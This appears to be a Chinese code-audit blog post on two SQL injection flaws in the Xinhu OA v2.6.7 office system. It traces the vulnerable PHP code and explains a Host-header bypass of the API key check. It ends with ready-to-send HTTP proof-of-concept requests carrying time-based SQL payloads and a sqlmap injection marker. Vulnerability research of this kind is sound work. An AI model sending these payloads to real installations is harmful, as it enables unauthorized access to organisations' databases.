> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzU2NDY2OTU4Nw==&mid=2247521083&idx=1&sn=a91574dc7063fe2f72c42be0861abc94

#  php代码审计篇 - 信呼OA 前台注入  
 船山信安   2025-06-17 18:02  
  
# 信呼OA v2.6.7 SQL注入漏洞  
  
## 系统介绍  
  

```
信呼，免费开源的办公OA系统，包括APP，pc上客户端，REIM即时通信，服务端等，让每个企业单位都有自己的办公系统。
```

  
官网：  
http://www.rockoa.com  
  
  
路由分析  
  
  
抓一个登录请求包分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OUDxUa119C00qvrhFELThw5xGUYjTEUnBa5BuyeEHqgpO4LIHqQ8sWtw/640?wx_fmt=png&from=appmsg "")  
  
其中a是方法 m是目录 如果有多层目录则 d是最外层目录  m由 文件名|目录 组成  
  
## 漏洞点一 （存在 ip限制）  
  
### 源码分析  
  
  
在文件中分析代码找到webmain/task/openapi/opendkqAction.php的  
  
addkqjs方法 调用了insert方法   

```
private function addkqjs($sn)  
{  
    $uarr = array(  
       'pinpai'=> '1',  
       'num'=> $sn,  
       'name'=> $sn,  
       'comid' => '1',  
       'optdt' => $this->now  
    );  
    $uarr['id'] = m('kqjsn')->insert($uarr);  
    return $uarr;  
}
```

  
  
一步步跟进去查看insert方法  确认传入的值被带入到sql语句中执行了sql  

```
public function insert($arr)  
{  
    $nid = 0;  
    if($this->record($arr, ''))$nid = $this->db->insert_id();  
    return $nid;  
}




 // include/class/mysql.php


public function record($arr, $where='')  
{  
    return $this->db->record($this->table, $arr, $where);  
}




public function record($table,$array,$where='')  
{  
    $addbool   = true;  
    if(!$this->isempt($where))$addbool=false;  
    $cont     = '';  
    if(is_array($array)){  
       foreach($array as $key=>$val){  
          $cont.=&#34;,`$key`=&#34;.$this->toaddval($val).&#34;&#34;;  
       }  
       $cont  = substr($cont,1);  
    }else{  
       $cont  = $array;  
    }  
    $table = $this->gettables($table);  
    if($addbool){  
       $sql=&#34;insert into $table set $cont&#34;;  
    }else{  
       $where = $this->getwhere($where);  
       $sql=&#34;update $table set $cont where $where&#34;;  
    }  
    return $this->tranbegin($sql);  
}


private function tranbegin($sql)  
{  
    //if($this->errorbool)return false;  
    if($this->conn == null)$this->connect();  
    $this->iudcount++;  
    if(!$this->tran){  
       //$this->starttran();  
       //$this->tran=true;    }  
    $rsa   = $this->query($sql);  
    $this->iudarr[]=$rsa;  
    if(!$rsa)$this->errorbool = true;  
    return $rsa;  
}


```

  
  
  
接下来就往上看哪里调用addkqjs方法传值 $sn  在同文件内 找到了senddata 调用了这个方法    

```
private function senddata($type)  
{  
    $str = $this->postdata;  
    if(isempt($str))$this->showreturn('', 'not data', 201);  
    $arr   = json_decode($str, true);  
    $oi    = 0;$uarr = array();$finarr = array();  
    $dtobj     = c('date');$adb   = m('admin');$db = m('kqdkjl');$uobj = m('userinfo');  
    $updt  = '';  
    $cheobj = c('check');  
    $snarr     = array();  
    if($type==9){  
       $snarr = $this->db->getarr('[Q]kqjsn','`pinpai`=1','`id`,`name`','num');  
    }  
    $datype = array('密码','指纹','刷卡');  


    if(is_array($arr))foreach($arr as $k=>$rs){  
       $name = isset($rs['name']) ? $rs['name'] : '';  
       $dkdt = isset($rs['dkdt']) ? $rs['dkdt'] : '';  
       $finge= isset($rs['finge']) ? $rs['finge'] : '';  
       $name = str_replace(&#34;'&#34;,'', $name);  


       $uid  = 0;  
       $snid = 0;  
       $sntype = 1;  
       $comid = 0;  
       $explain = '';  
       if($type==9){  
          $sn      = arrvalue($rs, 'sn');  
          if(!$sn)continue;  
          $snrs = arrvalue($snarr, $sn);  
          if(!$snrs){  
             $snrs = $this->addkqjs($sn);  
             $snarr[$sn] = $snrs;  
          }
```

  
  
继续分析代码$sn 由arrvalue方法取自传入的第一参数的 一个key为sn的valen值  

```
$sn      = arrvalue($rs, 'sn');  


function arrvalue($arr, $k, $dev='')  
{  
    $val  = $dev;  
    if(isset($arr[$k]))$val= $arr[$k];  
    return $val;  
}
```

  
  
继续分析代码 得知想要执行到这里 需要$type 等于9  
  
且  $rs 来自于 $arr 的value    然后  $arr 又来自于 json解码后的 $str   $str来自于 传入的post请求体  是可控的    
  
  
最后查找调用 senddata 被  同文件下的  zktimeAction 调用 同时也传入了9 满足上面的 $type =9    

```
public function zktimeAction()  
{  
    //9中控  
    $carr  = $this->senddata(9);  
    echo $carr['updt'];  
}
```

  
  
继续看代码发现 这个类的父类中存在一个鉴权  但是分析代码可知 Host 是127.0.0.1 或 192.168.x.x 的范围就可以绕过验证 。  

```
public function initAction()  
{  
    $this->display= false;  
    $openkey      = $this->post('openkey');  
    $this->openkey     = getconfig('openkey');  
    if($this->keycheck && HOST != '127.0.0.1' && !contain(HOST,'192.168') && $this->openkey != ''){  
       if($openkey != md5($this->openkey))$this->showreturn('', 'openkey not access', 201);  
    }  
    $this->getpostdata();  
}
```

  
  
按照路由构造请求url  
  
  
/index.php?m=opendkq|openapi&d=task&a=zktime  
  
  
按照sn的取值 构造两层json  
  
  
{"cn":{"sn":"123"}}  
  
  
host 为127.0.0.1  
  
### 漏洞利用  
  
#### poc  

```
POST /index.php?m=opendkq|openapi&d=task&a=zktime HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p4idg1a6f9b059t7laum6m333o; deviceid=1733809734848
Connection: close
Content-Length: 34
Content-Type: application/x-www-form-urlencoded


{&#34;cn&#34;:{&#34;sn&#34;:&#34;123' and sleep(3)#&#34;}}
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OU7ccpCgvYAUnx1u6S71RTicnPhD15atu5uScqF9qj754dYRDLGqlvRoA/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OUTicZGjKxRLnL2iaVQqpgHkyoTmwFVmia847myKD2qMgvqw9f4CiceZWmTQ/640?wx_fmt=png&from=appmsg "")  
####   
#### sqlmap  
  
  
sqlmap  结合burp  修改host  

```
POST /index.php?m=opendkq|openapi&d=task&a=zktime HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p4idg1a6f9b059t7laum6m333o; deviceid=1733809734848
Connection: close
Content-Length: 34
Content-Type: application/x-www-form-urlencoded


{&#34;cn&#34;:{&#34;sn&#34;:&#34;123'*&#34;}}
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OU3Cicg3giboxSAJz0VX7TdaKWItrPEU9ic6lBKAPEuWaBNRA2egsYNMxoA/640?wx_fmt=png&from=appmsg "")  
  
  
## 漏洞点二 （存在 ip限制）  
  
### 源码分析  
  
  
webmain/task/openapi/openbaseAction.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OU4SMyIzngdRHSgogULve1HGKoztZKn73JzxficBNtMy64BGqnf7b5F1g/640?wx_fmt=png&from=appmsg "")  
  
  
  
看getpostarr()方法可以分析出 传入的post值需要为json格式  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OUrYPqmSBVcPDsC91x9flf6XprIXib7FicDkZO0icMaKHm54aA40XIP5lQA/640?wx_fmt=png&from=appmsg "")  
  
  
继续分析下面的代码传入的参数basemodenum 赋值给了 $modenum   baseoptid参数 赋值给了 $adminid  但是经过了过滤 无法传入单引号等内容  
  
  
在21行代码中调用getuserid方法对 $adminid 参数进行了查询  并且在22行代码可以得知 需要让21行的查询获得数据 不然会直接报错终止  
  
  
根据查看sql语句可以得知 查询的内容在admin表中  分析可知 最简单方法的就是传入一个1 即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OUiclwfzUC99zKticghIuMDnvUT36Unh07tJrZFQeUyWYIBUmsPdYb0bog/640?wx_fmt=png&from=appmsg "")  
  
  
  
继续分析代码 查看querydata方法获得了三个参数做了什么操作  看代码发现 在方法中将传入的 $modenum 也就是 $num 传入了initflow方法中  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OUsw6YlMMYCF0bZibGTtUKaDouzbITxOAS33cRicibUIvXdbIBciaFOeWR0g/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OUUsklF6JBORrXEhwVuNneWHHeHEGdl4gbR10iaTkp0BAguhDRPkIvknA/640?wx_fmt=png&from=appmsg "")  
  
  
继续跟进initflow方法 发现又被传入了initdata 方法中   
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OUMSm5lHGh8iacA24JIBHYgTdSFTnRwQGyW1tm0BZm9baKAEl4GbkzRfA/640?wx_fmt=png&from=appmsg "")  
  
  
  
在这里 $num 的值被添加到了sql的一个条件语句中被执行 其中无任何限制 这样我们就可以开始构造poc 进行利用  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OU1KKwIrLEfDjOibBT5owj6yMPc1NczCLUYdMo2c1PQcbFxZEUz9nibkhA/640?wx_fmt=png&from=appmsg "")  
  
### 漏洞利用  
  
#### poc  

```
POST /index.php?m=openbase%7Copenapi&d=task&a=querydata HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Cookie: 


{&#34;baseoptid&#34;:&#34;1&#34;,&#34;basemodenum&#34;:&#34;a123456' OR SLEEP(0.01)#&#34;}
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OUfxJwg9lQOTafJ0zzhHAOs9bJb0kuolOEb3fzGZdf5EJgp4iboE5OC0A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP0ic1VCAkibxxasAHd4Lb7OUFr31gSTIOVSSQsfRl3HJl2icNLia2CDL7VgI6U4RVutf1Q8G0OrUj2dw/640?wx_fmt=png&from=appmsg "")  
####   
  
  
  
来源：  
https://xz.aliyun.com/news/18185  
  
